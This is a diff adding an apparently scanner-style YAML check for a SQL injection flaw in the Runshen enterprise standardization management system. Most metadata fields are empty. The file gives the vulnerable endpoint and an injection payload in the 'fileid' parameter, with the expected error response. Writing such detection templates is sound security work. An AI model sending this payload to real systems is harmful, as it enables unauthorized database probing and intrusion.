@@ -1,0 +1,18 @@
+id:
+info:
+  name: 润申信息企业标准化管理系统 SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /PDCA/ashx/CommentStandardHandler.ashx
+  data: |
+    action=detailInfo&fileid=1 and (select @@version)>0--
+response1:
+  headers:
+  body: SQL
+  code:
+requests2:
+response2:
